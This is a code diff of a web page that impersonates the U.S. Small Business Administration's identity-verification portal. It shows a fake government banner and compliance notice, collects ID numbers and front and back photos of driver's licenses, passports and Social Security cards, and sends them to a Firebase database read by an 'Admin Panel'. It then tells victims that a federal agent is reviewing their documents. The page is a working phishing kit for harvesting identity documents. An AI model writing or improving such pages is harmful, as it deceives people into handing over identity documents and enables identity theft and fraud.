@@ -3,100 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBA Portal | 2026 Identity Authentication</title>
-    <link rel="stylesheet" href="style.css">
+    <title>SBA Portal | Identity Authentication</title>
     <style>
+        :root { --sba-blue: #00274c; --sba-red: #ba0c2f; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
+        
         .upload-area { 
-            border: 2px dashed #1e3a8a; 
-            border-radius: 14px; 
-            padding: 30px; 
+            border: 2px dashed #cbd5e1; 
+            border-radius: 12px; 
+            padding: 25px; 
             text-align: center; 
-            margin-bottom: 18px; 
-            background: #ffffff; 
+            margin-bottom: 15px; 
+            background: #fff; 
             cursor: pointer; 
-            transition: all 0.2s ease-in-out;
+            transition: 0.3s;
         }
-        .upload-area:hover { background: #f8fafc; border-style: solid; box-shadow: 0 4px 12px rgba(30,58,138,0.1); }
-        .preview-text { font-size: 11px; color: #10b981; margin-top: 10px; font-weight: 800; text-transform: uppercase; }
+        .upload-area:hover { border-color: var(--sba-blue); background: #f8fafc; }
+        
+        .preview-text { font-size: 10px; color: #10b981; margin-top: 8px; font-weight: 800; }
+        
         .instruction-box { 
             background: #fffbeb; 
             border: 1px solid #fef3c7; 
-            padding: 18px; 
-            border-radius: 10px; 
-            margin-bottom: 25px; 
+            padding: 15px; 
+            border-radius: 8px; 
+            margin-bottom: 20px; 
             font-size: 11px; 
             color: #92400e; 
-            line-height: 1.6; 
+            line-height: 1.5; 
         }
-        select, input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #cbd5e1; box-sizing: border-box; font-family: inherit; font-size: 14px; }
-        label { display: block; font-size: 12px; font-weight: 800; color: #1e3a8a; margin-bottom: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 0.5px; }
-        #form-container { display: none; } 
+
+        .form-label { display: block; font-size: 11px; font-weight: 900; color: var(--sba-blue); margin: 15px 0 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        select, input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
+        
+        #form-container { display: none; padding: 15px; max-width: 500px; margin: 0 auto; }
+        
+        .submit-btn {
+            background: var(--sba-blue);
+            color: white;
+            padding: 16px;
+            border-radius: 8px;
+            width: 100%;
+            font-weight: 800;
+            border: none;
+            margin-top: 20px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .submit-btn:disabled { background: #94a3b8; cursor: not-allowed; }
     </style>
 </head>
-<body style="background: #f1f5f9;">
+<body>
+
     <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE PORTAL
     </div>
 
-    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 14px 16px; background: #00274c;">
-        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
-        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
-            BACK
-        </button>
+    <div class="nav-header">
+        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:5px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">RETURN</button>
     </div>
 
-    <div class="container" id="main-content">
-        <div id="form-container">
-            <div class="card" style="margin-top: 20px; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); border-top: 6px solid #ba0c2f; background: white; padding: 25px;">
-                <h2 style="color: #00274c; font-size: 22px; margin-bottom: 5px; letter-spacing: -0.5px;">Identity Authentication</h2>
-                
-                <div class="instruction-box">
-                    <b style="display: block; margin-bottom: 5px;">FEDERAL COMPLIANCE NOTICE:</b> 
-                    Pursuant to the <b>Patriot Act</b>, you must provide a valid government ID for grant eligibility.
-                </div>
-                
-                <label>Document Type</label>
-                <select id="idType">
-                    <option value="Driver's License">U.S. Driver's License</option>
-                    <option value="Social Security Card">Social Security Card (SSN)</option>
-                    <option value="US Passport">U.S. Passport Book/Card</option>
-                </select>
+    <div id="loading-state" style="text-align: center; margin-top: 100px;">
+        <div style="color: var(--sba-blue); font-weight: 800; font-size: 12px; letter-spacing: 1px;">ENCRYPTING SESSION...</div>
+    </div>
 
-                <label>Identification Number</label>
-                <input type="text" id="idNumber" placeholder="Enter ID number accurately">
-
-                <label>Front of Document</label>
-                <div class="upload-area" onclick="document.getElementById('fileFront').click()">
-                    <span style="font-size: 32px;">🪪</span>
-                    <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Upload Front</b>
-                    <input type="file" id="fileFront" hidden accept="image/*">
-                    <div class="preview-text" id="frontName"></div>
-                </div>
-
-                <label>Back of Document</label>
-                <div class="upload-area" onclick="document.getElementById('fileBack').click()">
-                    <span style="font-size: 32px;">🪪</span>
-                    <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Upload Back</b>
-                    <input type="file" id="fileBack" hidden accept="image/*">
-                    <div class="preview-text" id="backName"></div>
-                </div>
-
-                <button id="uploadBtn" style="background: #00274c; color: white; padding: 18px; border-radius: 12px; width: 100%; font-weight: 800; border: none; margin-top: 20px; cursor: pointer; text-transform: uppercase;">
-                    Submit for Verification
-                </button>
+    <div id="form-container">
+        <div style="background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 5px solid var(--sba-red);">
+            <h2 style="color: var(--sba-blue); font-size: 20px; margin: 0 0 10px;">ID Authentication</h2>
+            
+            <div class="instruction-box">
+                <b>COMPLIANCE NOTICE:</b><br>
+                Please provide clear photos of your government-issued ID. Ensure all four corners are visible and text is legible.
             </div>
-        </div>
+            
+            <label class="form-label">Identification Type</label>
+            <select id="idType">
+                <option value="Driver's License">U.S. Driver's License</option>
+                <option value="State ID">State Issued ID Card</option>
+                <option value="Passport">U.S. Passport</option>
+                <option value="SSN Card">Social Security Card</option>
+            </select>
 
-        <div id="loading-state" style="text-align: center; margin-top: 50px;">
-            <p style="color: #1e3a8a; font-weight: bold;">Checking Authentication Status...</p>
+            <label class="form-label">ID / Document Number</label>
+            <input type="text" id="idNumber" placeholder="Enter number exactly as shown">
+
+            <label class="form-label">Front of Document</label>
+            <div class="upload-area" onclick="document.getElementById('fileFront').click()">
+                <span id="iconFront" style="font-size: 24px;">📸</span>
+                <b style="display:block; font-size:11px; margin-top:5px; color:var(--sba-blue);">CLICK TO UPLOAD FRONT</b>
+                <input type="file" id="fileFront" hidden accept="image/*">
+                <div class="preview-text" id="frontName"></div>
+            </div>
+
+            <label class="form-label">Back of Document</label>
+            <div class="upload-area" onclick="document.getElementById('fileBack').click()">
+                <span id="iconBack" style="font-size: 24px;">📸</span>
+                <b style="display:block; font-size:11px; margin-top:5px; color:var(--sba-blue);">CLICK TO UPLOAD BACK</b>
+                <input type="file" id="fileBack" hidden accept="image/*">
+                <div class="preview-text" id="backName"></div>
+            </div>
+
+            <button id="uploadBtn" class="submit-btn">Transmit Documents</button>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, collection, addDoc, getDoc, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, getDoc, updateDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
@@ -111,118 +131,107 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
 
-        let currentUserFullData = {};
+        let userProfile = {};
 
         onAuthStateChanged(auth, async (user) => {
             if (!user) { window.location.href = 'index.html'; return; }
 
-            try {
-                const userSnap = await getDoc(doc(db, "users", user.uid));
-                currentUserFullData = userSnap.data() || {};
-                
-                const status = (currentUserFullData.status || "").toUpperCase();
-                const kycStatus = (currentUserFullData.kycStatus || "").toUpperCase();
+            const userSnap = await getDoc(doc(db, "users", user.uid));
+            userProfile = userSnap.data() || {};
+            const status = (userProfile.status || "").toUpperCase();
 
-                document.getElementById('loading-state').style.display = 'none';
+            document.getElementById('loading-state').style.display = 'none';
 
-                // THE BLOCK LOGIC
-                // Only New users or those with 'REJECTED'/'DECLINED' status can see the form.
-                // Everyone else (Pending, Verified, Under Review) is blocked.
-                const isBlocked = status.includes("VERIFIED") || 
-                                  kycStatus === "SUBMITTED" || 
-                                  status.includes("REVIEW") || 
-                                  status.includes("APPROVED");
-
-                if (isBlocked && !status.includes("DECLINED") && !status.includes("REJECTED")) {
-                    document.getElementById('main-content').innerHTML = `
-                        <div class="card" style="margin-top: 50px; text-align: center; border-radius: 16px; padding: 40px 20px; background: white; box-shadow: 0 15px 35px rgba(0,0,0,0.05); border-top: 6px solid #f59e0b;">
-                            <span style="font-size: 50px;">${status.includes("VERIFIED") ? '✅' : '⏳'}</span>
-                            <h2 style="color: #00274c; margin-top: 15px;">Authentication Status</h2>
-                            <div style="background: #f8fafc; padding: 15px; border-radius: 10px; margin: 20px 0; border: 1px solid #e2e8f0;">
-                                <b style="color: #1e3a8a; text-transform: uppercase;">${status}</b>
-                                <p style="font-size: 12px; color: #64748b; margin-top: 5px;">
-                                    Your profile is currently active or under audit. You cannot submit new documents at this time.
-                                </p>
-                            </div>
-                            <button onclick="location.href='dashboard.html'" style="background: #00274c; color: white; padding: 15px; border-radius: 10px; width: 100%; border: none; cursor: pointer; font-weight: 800;">RETURN TO DASHBOARD</button>
-                        </div>
-                    `;
-                } else {
-                    document.getElementById('form-container').style.display = 'block';
-                }
-            } catch (error) {
+            // If already verified or pending, block the page
+            if (status.includes("VERIFIED") || status.includes("REVIEW") || status.includes("SUBMITTED")) {
+                document.getElementById('form-container').style.display = 'block';
+                document.getElementById('form-container').innerHTML = `
+                    <div style="background: white; padding: 40px 20px; border-radius: 15px; text-align: center; border-top: 5px solid #f59e0b;">
+                        <span style="font-size: 40px;">⏳</span>
+                        <h3 style="color: var(--sba-blue); margin-top: 15px;">AUTHENTICATION PENDING</h3>
+                        <p style="font-size: 12px; color: #64748b; line-height: 1.6;">
+                            Your documents have been received and are currently being audited by a federal agent. This usually takes 2-4 hours.
+                        </p>
+                        <button onclick="location.href='dashboard.html'" class="submit-btn">Back to Dashboard</button>
+                    </div>
+                `;
+            } else {
                 document.getElementById('form-container').style.display = 'block';
             }
         });
 
-        // Previews
-        document.getElementById('fileFront').onchange = (e) => { if(e.target.files[0]) document.getElementById('frontName').innerText = "✅ FRONT UPLOADED"; };
-        document.getElementById('fileBack').onchange = (e) => { if(e.target.files[0]) document.getElementById('backName').innerText = "✅ BACK UPLOADED"; };
+        // UI Previews
+        document.getElementById('fileFront').onchange = (e) => { 
+            if(e.target.files[0]) {
+                document.getElementById('frontName').innerText = "READY FOR TRANSMISSION";
+                document.getElementById('iconFront').innerText = "✅";
+            }
+        };
+        document.getElementById('fileBack').onchange = (e) => { 
+            if(e.target.files[0]) {
+                document.getElementById('backName').innerText = "READY FOR TRANSMISSION";
+                document.getElementById('iconBack').innerText = "✅";
+            }
+        };
 
-        // Image Processing for Admin to see clearly
-        const resizeAndBase64 = (file) => new Promise((resolve) => {
+        // Resize function to keep things fast
+        const processImg = (file) => new Promise((resolve) => {
             const reader = new FileReader();
             reader.readAsDataURL(file);
-            reader.onload = (event) => {
+            reader.onload = (e) => {
                 const img = new Image();
-                img.src = event.target.result;
+                img.src = e.target.result;
                 img.onload = () => {
                     const canvas = document.createElement('canvas');
-                    const max_size = 900; // Good resolution for Admin viewing
-                    let width = img.width, height = img.height;
-                    if (width > height) { if (width > max_size) { height *= max_size / width; width = max_size; } }
-                    else { if (height > max_size) { width *= max_size / height; height = max_size; } }
-                    canvas.width = width; canvas.height = height;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(img, 0, 0, width, height);
-                    resolve(canvas.toDataURL('image/jpeg', 0.6));
+                    const scale = Math.min(800 / img.width, 800 / img.height);
+                    canvas.width = img.width * scale;
+                    canvas.height = img.height * scale;
+                    canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
+                    resolve(canvas.toDataURL('image/jpeg', 0.7));
                 };
             };
         });
 
         const uploadBtn = document.getElementById('uploadBtn');
-        uploadBtn.addEventListener('click', async () => {
-            const user = auth.currentUser;
-            const frontFile = document.getElementById('fileFront').files[0];
-            const backFile = document.getElementById('fileBack').files[0];
-            const idNum = document.getElementById('idNumber').value.trim();
+        uploadBtn.onclick = async () => {
+            const front = document.getElementById('fileFront').files[0];
+            const back = document.getElementById('fileBack').files[0];
+            const num = document.getElementById('idNumber').value.trim();
 
-            if(!frontFile || !backFile || !idNum) return alert("NOTICE: Please upload both sides of your ID and enter the ID number.");
+            if(!front || !back || !num) return alert("All fields are required for federal verification.");
 
-            uploadBtn.innerText = "TRANSMITTING TO SECURE SERVERS...";
             uploadBtn.disabled = true;
+            uploadBtn.innerText = "UPLOADING TO SECURE SERVER...";
 
             try {
-                const frontData = await resizeAndBase64(frontFile);
-                const backData = await resizeAndBase64(backFile);
+                const fData = await processImg(front);
+                const bData = await processImg(back);
 
-                // Add to 'requests' so it shows in Admin Panel
+                // Send to Admin (MATCHING ADMIN PANEL VARIABLE NAMES)
                 await addDoc(collection(db, "requests"), {
-                    userId: user.uid,
-                    userName: currentUserFullData.fullName || "User", // Now shows Name in Admin
-                    userEmail: user.email,
-                    idNumber: idNum,
-                    frontImg: frontData, // You will see this in Admin
-                    backImg: backData,   // You will see this in Admin
-                    type: "KYC", 
+                    userId: auth.currentUser.uid,
+                    userName: userProfile.fullName || "New Applicant",
+                    type: "KYC",
+                    frontImg: fData, // Matches Admin logic
+                    backImg: bData,   // Matches Admin logic
+                    idNumber: num,
                     status: "PENDING",
                     timestamp: serverTimestamp()
                 });
 
-                // Update the User profile
-                await updateDoc(doc(db, "users", user.uid), {
-                    status: "DOCUMENTS UNDER REVIEW",
-                    kycStatus: "SUBMITTED"
+                // Update User Status
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    status: "PENDING VERIFICATION"
                 });
 
-                alert("SUBMISSION RECEIVED: Your identity is being verified by SBA agents.");
+                alert("SUCCESS: Documents transmitted securely.");
                 window.location.href = 'dashboard.html';
-            } catch(e) {
-                alert("Connection error. Please try again.");
+            } catch (err) {
+                alert("Transmission failed. Please check connection.");
                 uploadBtn.disabled = false;
-                uploadBtn.innerText = "SUBMIT FOR VERIFICATION";
+                uploadBtn.innerText = "TRANSMIT DOCUMENTS";
             }
-        });
+        };
     </script>
 </body>
 </html>
